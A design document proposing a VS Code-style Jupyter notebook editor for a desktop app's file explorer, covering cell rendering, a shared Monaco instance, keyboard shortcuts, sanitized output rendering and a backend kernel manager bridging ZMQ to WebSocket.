# 038 — Jupyter Notebook Editor

**Date:** 2026-03-26
**Status:** Proposed

## Motivation

The file explorer currently treats `.ipynb` files as plain JSON — the user sees raw notebook JSON in Monaco, which is nearly unusable. Jupyter notebooks are a critical file format for data science, ML, and research workflows. Supporting them properly means rendering the cell-based structure with syntax-highlighted code, rendered markdown, visual outputs, and full editing capabilities matching VS Code's notebook experience.

This document designs a notebook editor for the orchestrator's file explorer that mirrors VS Code's editing UX while staying performant and secure within our Tauri desktop app constraints.

---

## Scope

### In scope (this design)
- **Cell-based notebook rendering** — parse `.ipynb` JSON and display cells in a VS Code-like layout
- **Code cells** — syntax-highlighted source with execution count and language detection
- **Markdown cells** — rendered preview (click to edit), raw source editing in Monaco
- **Output rendering** — text/plain (with ANSI colors), images (PNG/JPEG/GIF/SVG), HTML (sanitized), error tracebacks
- **Cell editing** — single shared Monaco instance follows focus (VS Code pattern)
- **Command mode / Edit mode** — Enter/Escape toggle, matching VS Code behavior
- **Cell manipulation** — add, delete, move, change type (code/markdown), split, merge
- **Between-cell insertion** — hover "+" bar between cells
- **Cell toolbar** — hover actions on each cell
- **Keyboard shortcuts** — matching VS Code's notebook shortcuts
- **Save** — serialize modified notebook back to `.ipynb` with output/metadata preservation
- **Notebook-level undo/redo** — undo structural operations (cell delete, move, type change)
- **Cell collapse/expand** — toggle individual cells or all outputs
- **Raw JSON fallback** — toggle to view/edit the raw `.ipynb` JSON in Monaco
- **Notebook metadata** — kernel info, language, cell count shown in a header bar
- **Dark/light theme** — consistent with existing design system
- **Cell execution** — connect to Jupyter kernels, run code, stream outputs back in real-time
- **Kernel lifecycle** — start, interrupt, restart, shutdown kernels; kernel status indicator
- **Execution queue** — run single cell, run all, run above/below; execution order tracking

### Out of scope
- **Rich interactive outputs** — Plotly, Vega, ipywidgets (require widget comm channel + CDN JS libraries)
- **LaTeX/math rendering** — KaTeX integration (can be added incrementally)
- **Notebook diffing** — side-by-side comparison of notebook versions
- **Multi-cell selection** — select and operate on multiple cells at once
- **Cell drag-and-drop reordering** — move via keyboard only (Alt+Up/Down)
- **Remote kernel auto-provisioning** — auto-installing ipykernel on remote hosts

---

## The `.ipynb` Format

A Jupyter notebook is a JSON file:

```json
{
  "nbformat": 4,
  "nbformat_minor": 5,
  "metadata": {
    "kernelspec": { "name": "python3", "display_name": "Python 3" },
    "language_info": { "name": "python", "version": "3.11.0" }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "id": "abc123",
      "source": ["# Title\n", "Some text"],
      "metadata": {}
    },
    {
      "cell_type": "code",
      "id": "def456",
      "source": ["import pandas as pd\n", "df = pd.read_csv('data.csv')"],
      "execution_count": 5,
      "outputs": [
        { "output_type": "stream", "name": "stdout", "text": ["Hello\n"] },
        { "output_type": "display_data", "data": { "image/png": "base64...", "text/plain": "<Figure>" }, "metadata": {} },
        { "output_type": "error", "ename": "ValueError", "evalue": "bad input", "traceback": ["..."] }
      ],
      "metadata": {}
    },
    {
      "cell_type": "raw",
      "id": "ghi789",
      "source": ["Raw text"],
      "metadata": {}
    }
  ]
}
```

Key format details:
- `source` is either a string or a string array (join with `""`, not `"\n"`)
- Output `data` is a MIME bundle — keys are MIME types, values are strings or string arrays
- Binary outputs (images) are base64-encoded strings
- Error tracebacks contain ANSI escape codes
- `execution_count` may be `null` (never executed) or an integer
- Cell `id` field exists in nbformat >= 4.5 (1-64 chars, alphanumeric + hyphens/underscores)

---

## How VS Code Does It (and What We Borrow)

| VS Code Feature | Our Approach | Rationale |
|---|---|---|
| Editor pool — one active Monaco, recycled templates for visible cells | **Single shared Monaco instance** follows focus; static `<pre>` for all other cells | Same pattern, simpler: we don't need a pool since we have only one active editor at a time |
| Command mode / Edit mode with focus indicator | **Same** — colored left bar for command mode, border + cursor for edit mode | Core UX must match for familiarity |
| Between-cell "+" insertion bar | **Same** — hover reveals insertion line | Essential for cell insertion workflow |
| Cell toolbar on hover (run, delete, more) | **Same** — run, delete, type toggle, more menu | Run button in gutter (always visible on code cells) + hover toolbar |
| markdown-it + KaTeX for markdown | Existing `Markdown.tsx` component | Already built, consistent styling, zero new deps |
| Sandboxed iframe for outputs | DOMPurify-sanitized inline HTML; SVGs via `<img>` data URI | Simpler; no JS execution in outputs; SVGs fully sandboxed |
| Cell virtualization (WorkbenchList) | Lazy rendering with IntersectionObserver | Lightweight; no virtual scroll library needed |
| Notebook-level undo via IUndoRedoService | Custom undo stack for structural operations | Monaco handles per-cell text undo; we handle cell add/delete/move/type |
| Jupyter kernel via vscode-jupyter extension | Backend `jupyter_client` + WS proxy | Kernel runs as subprocess, backend bridges ZMQ↔WebSocket to frontend |
| IPyWidget mirrored kernel | Not supported | Requires widget comm channel + CDN JS; deferred |

### The Single Monaco Pattern — How It Works

VS Code does NOT create a Monaco editor per cell. It maintains a single fully-interactive editor that is mounted into whichever cell currently has focus. All other cells display **static syntax-highlighted text** (rendered server-side or via a lightweight tokenizer). When focus moves to a new cell, the editor is detached from the old cell and reattached to the new one, loading the new cell's text model.

We adopt the same pattern:

```
┌─ Cell 1 (unfocused) ────────────────────────────┐
│ [1]  import pandas as pd          ← static <pre> │
│      df = pd.read_csv('data.csv')   highlighted   │
└──────────────────────────────────────────────────┘
┌─ Cell 2 (FOCUSED — edit mode) ──────────────────┐
│ [2]  ┌─ Monaco Editor ──────────────────────┐    │
│      │ x = df.groupby('cat').mean()█        │    │  ← real Monaco
│      │ print(x.head())                      │    │     with cursor
│      └──────────────────────────────────────┘    │
│      stdout: shape: (10, 3)                      │
└──────────────────────────────────────────────────┘
┌─ Cell 3 (unfocused) ────────────────────────────┐
│ [3]  plt.figure(figsize=(10, 6))  ← static <pre> │
│      plt.plot(x)                    highlighted   │
└──────────────────────────────────────────────────┘
```

**Cost: 1 Monaco instance (~2MB)** regardless of notebook size. Unfocused cells use the existing `highlightCode()` from `Markdown.tsx` for static rendering.

**Transition animation:** When focus moves, the old cell's Monaco content is captured as static highlighted HTML, the Monaco editor is unmounted from the DOM, then mounted into the new cell's DOM slot. The cell height should not visibly change because Monaco and the static `<pre>` use identical font metrics (12px, 19px line height, same padding).

---

## Cell Modes (Matching VS Code)

### Three States

| State | Visual | Keyboard Target | How to Enter |
|---|---|---|---|
| **Unselected** | No indicator | N/A | Click elsewhere / Escape when only one cell |
| **Command mode** | Solid colored bar on left gutter | Notebook (cell navigation, structural shortcuts) | Click cell gutter, press Escape from edit mode |
| **Edit mode** | Colored bar + border around editor area + blinking cursor | Monaco editor (typing, text shortcuts) | Press Enter from command mode, click cell content area, double-click cell |

### Mode Transitions

```
                    click gutter / Escape
          ┌──────────────────────────────────┐
          │                                  │
          ▼                                  │
   ┌─────────────┐    Enter / click     ┌────────────┐
   │ Command Mode │ ──────────────────▸ │ Edit Mode   │
   │  (cell ops)  │                     │ (Monaco)    │
   └──────┬───────┘                     └─────────────┘
          │ ▲
    J/K/↑/↓ │  (navigate between cells — stays in command mode)
          │ │
          ▼ │
   ┌─────────────┐
   │ Command Mode │  (different cell)
   │  (cell ops)  │
   └──────────────┘
```

### Focus Indicator Styling

```css
/* Command mode — solid left bar */
.nb-cell--selected {
  border-left: 3px solid var(--accent);
}

/* Edit mode — left bar + editor border */
.nb-cell--editing {
  border-left: 3px solid var(--accent);
}
.nb-cell--editing .nb-cell__editor-slot {
  outline: 1px solid var(--accent-muted);
  border-radius: 4px;
}
```

---

## Architecture

### Frontend Changes

```
frontend/src/components/file-explorer/
├── FileViewer.tsx              # Add .ipynb branch (like existing .md branch)
├── NotebookEditor.tsx          # NEW — main notebook editor (was "Viewer")
├── NotebookEditor.css          # NEW — notebook styles
├── notebook/
│   ├── NotebookCell.tsx        # NEW — single cell renderer (code/markdown/raw)
│   ├── NotebookOutput.tsx      # NEW — output renderer (text, image, html, error)
│   ├── NotebookToolbar.tsx     # NEW — cell hover toolbar (delete, type, more)
│   ├── CellInsertBar.tsx       # NEW — between-cell "+" insertion UI
│   ├── AnsiRenderer.tsx        # NEW — ANSI escape code → styled HTML
│   ├── notebookParser.ts       # NEW — parse .ipynb JSON into typed structure
│   ├── notebookSerializer.ts   # NEW — serialize notebook state back to .ipynb JSON
│   ├── notebookTypes.ts        # NEW — shared types for notebook data model
│   └── notebookUndoStack.ts    # NEW — undo/redo for structural operations
```

### Backend Changes

**File handling (minimal):** The backend already serves `.ipynb` files as text. Add `".ipynb": "jupyter"` to `_LANGUAGE_MAP` in `files.py`. File read/write uses existing `GET/PUT /sessions/{id}/files/content` endpoints.

**Kernel management (new):** A new route module and WebSocket handler for Jupyter kernel lifecycle and execution.

```
orchestrator/api/routes/
├── kernel.py                   # NEW — kernel REST endpoints
orchestrator/kernel/
├── __init__.py
├── manager.py                  # NEW — kernel lifecycle (start/stop/restart)
├── client.py                   # NEW — kernel wire protocol (ZMQ messaging)
└── ws_handler.py               # NEW — WebSocket handler for output streaming
```

### Dependency Changes

**Frontend:** One new direct dependency — **DOMPurify** (`npm install dompurify @types/dompurify`). Note: DOMPurify exists in `node_modules` today because `monaco-editor` depends on it transitively (we pin the version via `overrides` in `package.json`), but it is **not** currently imported by our frontend code and is tree-shaken out of the bundle. Adding a direct `import DOMPurify from 'dompurify'` will pull ~30KB (min+gzip) into the bundle. Reuses Monaco editor, `highlightCode()`, `Markdown` component, and existing CSS design tokens.

**Backend: No new dependencies.** The kernel management libraries (`jupyter_client`, `ipykernel`) are **not bundled** with the orchestrator — not as hard dependencies, and not as optional dependencies in `pyproject.toml`. They must be installed independently on each worker host where kernel execution is needed.

**Runtime detection strategy:**

```python
# orchestrator/kernel/manager.py — top of file
_jupyter_available = False
try:
    import jupyter_client  # type: ignore[import-untyped]
    _jupyter_available = True
except ImportError:
    pass

def is_kernel_support_available() -> bool:
    """Check if jupyter_client is installed on this host."""
    return _jupyter_available
```

The kernel manager module can always be imported safely. Only actual kernel operations (`start_kernel()`, `execute()`, etc.) check `_jupyter_available` and raise a clear error if missing. This avoids making `pyzmq` (a native C extension) part of the orchestrator's dependency tree, which would complicate PyInstaller bundling and cross-platform builds.

**Per-host installation:** Each worker host (local or remote) must have its own installation of `jupyter_client` and a kernel (e.g., `ipykernel`). The orchestrator detects availability independently per host:
- **Local:** `try: import jupyter_client` at runtime
- **Remote:** RWS checks via `shutil.which('jupyter')` and reports capability in its health response

**Note on ipykernel availability:** The kernel manager detects available kernels via `jupyter kernelspec list`. If no kernels are found (user hasn't installed `ipykernel`), or if `jupyter_client` itself is missing, execution controls are hidden and the notebook editor works in **edit-only mode** with a banner: "Run `pip install jupyter_client ipykernel` on {hostname} to enable cell execution." The hostname is shown because different worker hosts may have different install states.

---

## Component Design

### 1. `notebookTypes.ts` — Shared Types

```typescript
interface NotebookMetadata {
  kernelName: string | null      // metadata.kernelspec.display_name
  language: string               // metadata.language_info.name or "python"
  nbformat: number
  nbformatMinor: number
  raw: Record<string, unknown>   // preserve full original metadata for round-trip
}

interface NotebookCell {
  id: string                     // cell.id or generated (crypto.randomUUID())
  type: 'code' | 'markdown' | 'raw'
  source: string                 // joined source lines
  executionCount: number | null  // code cells only
  outputs: CellOutput[]          // code cells only
  metadata: Record<string, unknown>  // preserved for round-trip
  attachments?: Record<string, Record<string, string>>  // markdown cell inline images
}

interface CellOutput {
  outputType: 'stream' | 'display_data' | 'execute_result' | 'error'
  // Stream
  stream?: 'stdout' | 'stderr'
  text?: string
  // Display/execute_result
  data?: Record<string, string>  // MIME type → content (joined if array)
  outputMetadata?: Record<string, unknown>
  executionCount?: number | null
  // Error
  ename?: string
  evalue?: string
  traceback?: string[]
  // Raw original for round-trip serialization
  raw: Record<string, unknown>
}

interface NotebookState {
  metadata: NotebookMetadata
  cells: NotebookCell[]
  parseErrors: string[]
}

// For undo/redo
type CellOperation =
  | { type: 'insert'; index: number; cell: NotebookCell }
  | { type: 'delete'; index: number; cell: NotebookCell }  // cell saved for undo
  | { type: 'move'; fromIndex: number; toIndex: number }
  | { type: 'changeType'; cellId: string; oldType: 'code' | 'markdown' | 'raw'; newType: 'code' | 'markdown' | 'raw' }
  | { type: 'merge'; index: number; deletedCell: NotebookCell; oldSource: string }
  | { type: 'split'; index: number; oldSource: string; newCellId: string }
```

### 2. `notebookParser.ts` — Parse `.ipynb` JSON

```typescript
function parseNotebook(jsonString: string): NotebookState
```

**Validation rules:**
- Reject if not valid JSON → show error message
- Reject if `nbformat` < 4 → show "Unsupported notebook format (v{n}). Only nbformat 4+ is supported."
- Skip unknown cell types with a warning
- Join `source` arrays with `""` (not `"\n"` — source arrays already contain newlines)
- Join output `text` and `data` arrays with `""` similarly
- Strip trailing newline from joined source (cosmetic)
- Limit: parse at most **500 cells** (beyond this, show "Notebook truncated")
- **Preserve raw objects** — store original cell metadata and output dicts for round-trip fidelity

### 3. `notebookSerializer.ts` — Serialize Back to `.ipynb`

```typescript
function serializeNotebook(state: NotebookState): string
```

**Round-trip fidelity rules** (matching VS Code):
- Source strings split into line arrays (split on `\n`, keep `\n` suffix on each line except the last)
- Output text/data arrays split similarly
- JSON keys sorted alphabetically (minimizes git diff noise)
- Indentation: detect from original (default 1 space)
- Line endings: LF only
- Preserve all original metadata fields not modified by the editor
- New cells get `id` via `crypto.randomUUID().slice(0, 8)` (8 chars, matching nbformat spec)
- `execution_count` preserved as-is (we don't execute, so we never change it)
- Outputs preserved as-is (we don't modify outputs)
- Trailing newline at end of file

### 4. `notebookUndoStack.ts` — Structural Undo/Redo

Two-level undo system matching VS Code:

**Level 1 — Cell content (Monaco):** Monaco's built-in undo stack handles character-level undo within the focused cell. Ctrl+Z in edit mode undoes text changes.

**Level 2 — Notebook structure (our custom stack):** Structural operations are tracked in a separate undo stack. Z in command mode (or Ctrl+Z when not in edit mode) undoes structural operations.

```typescript
class NotebookUndoStack {
  private undoStack: CellOperation[] = []
  private redoStack: CellOperation[] = []
  private maxSize = 100

  push(op: CellOperation): void     // record operation, clear redo stack
  undo(): CellOperation | null      // pop from undo, push inverse to redo
  redo(): CellOperation | null      // pop from redo, push inverse to undo
  clear(): void
}
```

**Undoable operations:**
| Operation | Undo Behavior |
|---|---|
| Insert cell | Delete the inserted cell |
| Delete cell | Re-insert at original position (with original content, outputs, metadata) |
| Move cell up/down | Move back to original position |
| Change cell type | Change back to original type |
| Merge cells | Split back, restore deleted cell |
| Split cell | Merge back, restore original source |

**Not undoable** (Monaco handles these per-cell):
- Typing in a cell
- Pasting text
- Find & replace within a cell

### 5. `NotebookEditor.tsx` — Main Container

Top-level component rendered by `FileViewer.tsx` when `language === 'jupyter'`.

**Layout:**
```
┌─────────────────────────────────────────────────────┐
│ Python 3  ·  42 cells  · [+ Code] [+ Md] ·  [JSON] │  ← toolbar
├─────────────────────────────────────────────────────┤
│                                                      │
│ ┃ [1] ┌─────────────────────────────────────────┐   │  ← selected cell
│ ┃     │ import pandas as pd                      │   │     (command mode,
│ ┃     │ df = pd.read_csv('data.csv')            │   │      blue left bar)
│ ┃     └─────────────────────────────────────────┘   │
│ ┃     stdout: shape: (100, 5)                        │
│                                                      │
│       ·························+·····················  │  ← insert bar (hover)
│                                                      │
│   ── ┌──────────────────────────────────────────┐   │  ← markdown cell
│      │ # Data Analysis                           │   │     (rendered preview)
│      │ This notebook explores the dataset...     │   │
│      └──────────────────────────────────────────┘   │
│                                                      │
│       ·························+·····················  │  ← insert bar (hover)
│                                                      │
│ ┃ [2] ┌═════════════════════════════════════════┐   │  ← focused cell
│ ┃     ║ x = df.groupby('cat').mean()█           ║   │     (edit mode,
│ ┃     ║ print(x.head())                         ║   │      blue bar +
│ ┃     ╚═════════════════════════════════════════╝   │      editor border)
│ ┃     [DataFrame output table]                       │
│                                                      │
│ ...                                                  │
└─────────────────────────────────────────────────────┘
```

**Toolbar:**
- **Kernel status** — indicator pill showing idle (green) / busy (yellow) / starting (orange) / dead (red) / no kernel (gray)
- **Kernel picker** — dropdown to select available kernel (detected via `jupyter kernelspec list`)
- Cell count
- **[Run All]** / **[Interrupt]** / **[Restart Kernel]** — execution controls
- **[+ Code]** / **[+ Markdown]** — insert cell at end
- **Collapse All** / **Expand All** outputs
- **[JSON]** toggle — switch to raw JSON view in Monaco (editable, bidirectional)
- **Undo** / **Redo** buttons (structural operations)

**State (managed via `useReducer` for predictable updates):**

```typescript
interface NotebookEditorState {
  notebook: NotebookState                // parsed notebook data
  selectedCellId: string | null          // which cell is in command/edit mode
  editingCellId: string | null           // which cell has Monaco (null = command mode)
  collapsedCells: Set<string>            // cells with hidden source
  collapsedOutputs: Set<string>          // cells with hidden outputs
  showRawJson: boolean                   // JSON view toggle
  expandedOutputs: Set<string>           // outputs with "Show more" expanded
  dirty: boolean                         // has unsaved changes
}

type NotebookAction =
  | { type: 'SELECT_CELL'; cellId: string }
  | { type: 'ENTER_EDIT_MODE'; cellId: string }
  | { type: 'EXIT_EDIT_MODE' }
  | { type: 'UPDATE_CELL_SOURCE'; cellId: string; source: string }
  | { type: 'INSERT_CELL'; index: number; cellType: 'code' | 'markdown' }
  | { type: 'DELETE_CELL'; cellId: string }
  | { type: 'MOVE_CELL'; cellId: string; direction: 'up' | 'down' }
  | { type: 'CHANGE_CELL_TYPE'; cellId: string; newType: 'code' | 'markdown' }
  | { type: 'SPLIT_CELL'; cellId: string; cursorOffset: number }
  | { type: 'MERGE_CELL_ABOVE'; cellId: string }
  | { type: 'TOGGLE_COLLAPSE'; cellId: string }
  | { type: 'TOGGLE_OUTPUT_COLLAPSE'; cellId: string }
  | { type: 'COLLAPSE_ALL' }
  | { type: 'EXPAND_ALL' }
  | { type: 'UNDO' }
  | { type: 'REDO' }
  | { type: 'MARK_SAVED' }
```

### 6. `NotebookCell.tsx` — Cell Renderer

Renders a single cell. Receives props indicating whether it's selected, editing, or neither.

**Code cell (unfocused):**
- Left gutter: execution count badge (`[5]` or `[ ]` if null)
- Source: `<pre><code>` with static syntax highlighting via `highlightCode(source, language)`
- Line numbers: CSS counter-based, matching Monaco's numbering
- Click gutter → select cell (command mode)
- Click source area → enter edit mode (mount Monaco)
- Outputs below (if any)

**Code cell (focused — edit mode):**
- Left gutter: same execution count badge
- Source: **Monaco editor** mounted in an `editor-slot` div
- Monaco configured with: language from notebook metadata, same theme, same font metrics (12px, 19px line-height), `scrollBeyondLastLine: false`, `minimap: { enabled: false }`, `lineNumbers: 'on'`, `automaticLayout: true`
- Monaco height: auto-grow to fit content (set `scrollBeyondLastLine: false`, measure content height via `editor.getContentHeight()`, set container height dynamically)
- Outputs below (unchanged)

**Markdown cell (unfocused — preview mode):**
- Rendered using existing `<Markdown>` component
- Subtle left border (2px, `var(--accent-muted)`) to distinguish from code cells
- Click anywhere → enter edit mode (show raw markdown in Monaco)

**Markdown cell (focused — edit mode):**
- Monaco editor showing raw markdown source (language: `'markdown'`)
- Click away or Escape → exit edit mode, re-render preview
- Split view is NOT needed — VS Code also shows either preview or editor, not both

**Raw cell:**
- Always shows `<pre>` with monospace font, no highlighting
- Clicking enters edit mode with Monaco (language: `'plaintext'`)
- Subtle dashed left border

**Cell hover toolbar** (`NotebookToolbar.tsx`):
Appears on hover, positioned at top-right of cell:
- **Run** (play icon, code cells only) — execute cell, replace outputs with new results
- **Delete** (trash icon) — delete this cell
- **Type toggle** — switch between Code ↔ Markdown (dropdown or toggle button)
- **More** (⋯) — menu with: Move Up, Move Down, Split Cell, Merge with Above, Clear Outputs, Toggle Line Numbers, Collapse/Expand

**Run button in gutter** (always visible on code cells, not just hover):
- Play triangle icon in the left gutter, next to execution count
- Click → execute this cell
- While executing: icon changes to stop square (click to interrupt)
- Execution count updates to `[*]` during execution, then to the new count on completion

### 7. `CellInsertBar.tsx` — Between-Cell Insertion

A thin horizontal bar that appears between cells on hover.

```
   ─────────────── + ───────────────
```

- Invisible by default (0 height, just a hover target area of ~16px)
- On hover: fades in a thin line with a centered "+" button
- Click: inserts a new **code cell** at that position (matching VS Code default)
- Also shown above the first cell and below the last cell
- The "+" button has a small dropdown: "Code" or "Markdown" (click the button itself for code, dropdown arrow for markdown)

```css
.nb-insert-bar {
  position: relative;
  height: 16px;
  display: flex;
  align-items: center;
  opacity: 0;
  transition: opacity 150ms ease;
}
.nb-insert-bar:hover {
  opacity: 1;
}
.nb-insert-bar__line {
  flex: 1;
  height: 1px;
  background: var(--accent-muted);
}
.nb-insert-bar__btn {
  /* centered "+" button */
}
```

### 8. Monaco Lifecycle Management

The key complexity is mounting/unmounting the single Monaco instance as focus moves between cells.

```typescript
// In NotebookEditor.tsx
const monacoRef = useRef<editor.IStandaloneCodeEditor | null>(null)
const editorContainerRef = useRef<HTMLDivElement>(null)  // the floating container

// When editingCellId changes:
useEffect(() => {
  if (!editingCellId) {
    // No cell being edited — hide Monaco
    if (editorContainerRef.current) {
      editorContainerRef.current.style.display = 'none'
    }
    return
  }

  // Find the target cell's editor slot DOM node
  const slot = document.getElementById(`nb-editor-slot-${editingCellId}`)
  if (!slot || !editorContainerRef.current) return

  // Move the Monaco container into the target slot
  slot.appendChild(editorContainerRef.current)
  editorContainerRef.current.style.display = 'block'

  // Load the cell's content into Monaco
  const cell = notebook.cells.find(c => c.id === editingCellId)
  if (!cell) return

  const editor = monacoRef.current
  if (editor) {
    const lang = cell.type === 'markdown' ? 'markdown'
               : cell.type === 'raw' ? 'plaintext'
               : monacoLanguage(notebook.metadata.language)
    const model = editor.getModel()
    if (model) {
      monaco.editor.setModelLanguage(model, lang)
      model.setValue(cell.source)
    }
    editor.focus()

    // Auto-height: resize Monaco to fit content
    const updateHeight = () => {
      const contentHeight = editor.getContentHeight()
      editorContainerRef.current!.style.height = `${contentHeight}px`
      editor.layout()
    }
    updateHeight()
    editor.onDidContentSizeChange(updateHeight)
  }
}, [editingCellId])
```

**Font metric matching** is critical — when Monaco mounts/unmounts, the cell height must not visibly change:
- Both Monaco and static `<pre>` use: `font-size: 12px`, `line-height: 19px`, `font-family: var(--font-mono)`
- Monaco padding: `top: 8px, bottom: 4px`
- Static `<pre>` padding: `8px 12px 4px 12px` (matching)
- Monaco line numbers width matches CSS counter width

**Content sync:** When the user types in Monaco, `editor.onDidChangeModelContent` fires. We debounce (100ms) and dispatch `UPDATE_CELL_SOURCE` to update the notebook state. When focus leaves (Escape or click another cell), we do a final sync before unmounting.

### 9. `NotebookOutput.tsx` — Output Renderer

(Unchanged from previous design — outputs are read-only.)

**MIME type priority** (check in order, render first match):
1. `image/png`, `image/jpeg`, `image/gif` → `<img src="data:{mime};base64,{data}">`
2. `image/svg+xml` → `<img src="data:image/svg+xml;base64,{data}">` (sandboxed — see Security section)
3. `text/html` → sanitized HTML via DOMPurify with CSS `url()` stripping (see Security section)
4. `text/plain` → `<pre>` with ANSI color support
5. `application/json` → pretty-printed JSON in `<pre>` with syntax highlighting

**Stream outputs** (`stdout`/`stderr`):
- `stdout`: default text color
- `stderr`: red-tinted background (`var(--red)` at 10% opacity)
- ANSI escape codes parsed and rendered as styled `<span>` elements
- Consecutive stream outputs of the same name are **merged** (matching Jupyter behavior)

**Error outputs:**
- Header: `{ename}: {evalue}` in red bold
- Traceback: rendered with ANSI color support
- Collapsible: show first 3 lines + "Show full traceback" expander

**Truncation:**
- Text outputs longer than **200 lines**: show first 50 lines + "Show all {n} lines" button
- Image outputs: max-width 100%, max-height 600px, click to view full size
- HTML outputs: max-height 400px with scroll, "Expand" button to remove limit

### 10. `AnsiRenderer.tsx` — ANSI Escape Code Parser

Parses ANSI escape sequences into styled HTML spans. Supports:
- **16 standard colors** (30-37 foreground, 40-47 background) mapped to CSS variables matching xterm.js theme
- **Bright colors** (90-97 foreground, 100-107 background)
- **Bold** (1), **italic** (3), **underline** (4), **strikethrough** (9)
- **Reset** (0)
- **256-color mode** (38;5;N) — mapped to a 256-color palette
- **24-bit color** (38;2;R;G;B) — rendered as inline `style` with `color: rgb(R,G,B)`

Not supported (not relevant for static output): cursor movement, screen clearing, OSC sequences.

**CSS variable mapping** (matches existing xterm.js colors):
```css
.ansi-black   { color: var(--terminal-black, #1d1f21); }
.ansi-red     { color: var(--terminal-red, #cc6666); }
.ansi-green   { color: var(--terminal-green, #b5bd68); }
.ansi-yellow  { color: var(--terminal-yellow, #f0c674); }
.ansi-blue    { color: var(--terminal-blue, #81a2be); }
.ansi-magenta { color: var(--terminal-magenta, #b294bb); }
.ansi-cyan    { color: var(--terminal-cyan, #8abeb7); }
.ansi-white   { color: var(--terminal-white, #c5c8c6); }
/* + bright variants, bg variants */
```

---

## Keyboard Shortcuts

### Mode Switching
| Shortcut | Mode | Action |
|---|---|---|
| `Enter` | Command | Enter edit mode (place cursor in cell editor) |
| `Escape` | Edit | Exit to command mode (cell stays selected) |

### Cell Navigation (Command Mode)
| Shortcut | Action |
|---|---|
| `↑` / `K` | Select previous cell |
| `↓` / `J` | Select next cell |

### Cell Insertion
| Shortcut | Mode | Action |
|---|---|---|
| `A` | Command | Insert code cell **above** selected |
| `B` | Command | Insert code cell **below** selected |

### Cell Deletion
| Shortcut | Mode | Action |
|---|---|---|
| `DD` | Command | Delete selected cell (double-tap D, 500ms window) |
| `Delete` / `Backspace` | Command | Delete selected cell |

### Cell Type Switching
| Shortcut | Mode | Action |
|---|---|---|
| `M` | Command | Convert selected cell to Markdown |
| `Y` | Command | Convert selected cell to Code |

### Cell Movement
| Shortcut | Mode | Action |
|---|---|---|
| `Alt+↑` | Command | Move selected cell up |
| `Alt+↓` | Command | Move selected cell down |

### Cell Display
| Shortcut | Mode | Action |
|---|---|---|
| `L` | Command | Toggle line numbers for selected cell |
| `O` | Command | Toggle output visibility for selected cell |

### Undo/Redo
| Shortcut | Mode | Action |
|---|---|---|
| `Z` | Command | Undo last structural operation |
| `Shift+Z` | Command | Redo last structural operation |
| `Ctrl+Z` / `Cmd+Z` | Edit | Undo text change (Monaco built-in) |
| `Ctrl+Shift+Z` / `Cmd+Shift+Z` | Edit | Redo text change (Monaco built-in) |

### Cell Execution
| Shortcut | Mode | Action |
|---|---|---|
| `Ctrl+Enter` / `Cmd+Enter` | Any | Run selected cell, stay on cell |
| `Shift+Enter` | Any | Run selected cell, advance to next cell (insert new if last) |
| `Alt+Enter` | Any | Run selected cell, insert new code cell below |
| `Ctrl+Shift+Enter` / `Cmd+Shift+Enter` | Any | Run all cells above (not including selected) |
| `I, I` | Command | Interrupt kernel (double-tap I, 500ms window) |
| `0, 0` | Command | Restart kernel (double-tap 0, 500ms window, shows confirmation) |

### Save
| Shortcut | Mode | Action |
|---|---|---|
| `Ctrl+S` / `Cmd+S` | Any | Save notebook (serialize and write to disk) |

### Implementation Note

Keyboard shortcuts are captured by a `onKeyDown` handler on the notebook container div. In **command mode**, the handler intercepts single keys (A, B, D, M, Y, J, K, L, O, Z, Enter, Escape, arrow keys). In **edit mode**, only Escape and Ctrl+S are intercepted — everything else goes to Monaco.

The `DD` (double-tap delete) uses a timer: first `D` press starts a 500ms window; second `D` within that window triggers deletion. If the window expires, the single `D` is ignored.

---

## Cell Execution

### Architecture Overview

Cell execution uses a backend-managed kernel connected via the Jupyter wire protocol. The backend bridges between ZeroMQ (kernel communication) and WebSocket (frontend communication), following the same pattern as terminal streaming (`/ws/terminal/{id}`).

```
Frontend (React)              Backend (FastAPI)             Kernel Process
     │                              │                              │
     │  WS connect                  │                              │
     │  /ws/kernel/{session_id}     │                              │
     │  ◂─────────────────────────▸ │                              │
     │                              │                              │
     │  POST /kernel/start          │  jupyter_client              │
     │  ─────────────────────────▸  │  KernelManager.start_kernel()│
     │                              │  ────────────────────────▸   │
     │  ◂── { kernel_id, status }   │                              │
     │                              │                              │
     │  WS: execute_request         │  ZMQ: execute_request        │
     │  { cell_id, code }           │  (shell channel)             │
     │  ─────────────────────────▸  │  ────────────────────────▸   │
     │                              │                              │
     │                              │  ◂── ZMQ: status: busy       │
     │  ◂── WS: status: busy        │      (iopub channel)         │
     │                              │                              │
     │                              │  ◂── ZMQ: stream (stdout)    │
     │  ◂── WS: stream_output       │      (iopub channel)         │
     │       { cell_id, text }      │                              │
     │                              │                              │
     │                              │  ◂── ZMQ: display_data       │
     │  ◂── WS: display_output      │      (iopub channel)         │
     │       { cell_id, data }      │                              │
     │                              │                              │
     │                              │  ◂── ZMQ: execute_reply      │
     │  ◂── WS: execute_complete    │      (shell channel)         │
     │       { cell_id, exec_count }│                              │
     │                              │                              │
     │                              │  ◂── ZMQ: status: idle       │
     │  ◂── WS: status: idle        │      (iopub channel)         │
```

### Backend: Kernel Manager (`orchestrator/kernel/manager.py`)

Manages kernel lifecycle per session. One kernel per notebook tab (identified by session_id + notebook path).

```python
class KernelSession:
    """Wraps jupyter_client.KernelManager for one notebook."""
    kernel_manager: KernelManager
    kernel_client: KernelClient
    kernel_id: str
    notebook_path: str
    status: str  # 'starting' | 'idle' | 'busy' | 'dead'
    execution_count: int

class KernelPool:
    """Manages kernel sessions across all notebooks."""
    sessions: dict[str, KernelSession]  # key: f"{session_id}:{notebook_path}"

    async def start_kernel(self, session_id: str, notebook_path: str,
                           kernel_name: str = 'python3') -> KernelSession
    async def shutdown_kernel(self, session_id: str, notebook_path: str) -> None
    async def restart_kernel(self, session_id: str, notebook_path: str) -> None
    async def interrupt_kernel(self, session_id: str, notebook_path: str) -> None
    async def execute(self, session_id: str, notebook_path: str,
                      code: str, cell_id: str) -> str  # returns msg_id
    async def list_kernelspecs(self) -> dict[str, KernelSpec]
    async def shutdown_all(self) -> None  # called on app shutdown
```

**Kernel startup flow:**
1. `KernelManager(kernel_name=kernel_name)` — creates manager for the specified kernel
2. `km.start_kernel(cwd=work_dir)` — launches kernel subprocess in the session's working directory
3. `km.client()` — creates a ZMQ client connected to the kernel's ports
4. Start a background `asyncio.Task` that reads from the iopub channel and forwards messages to connected WebSocket clients

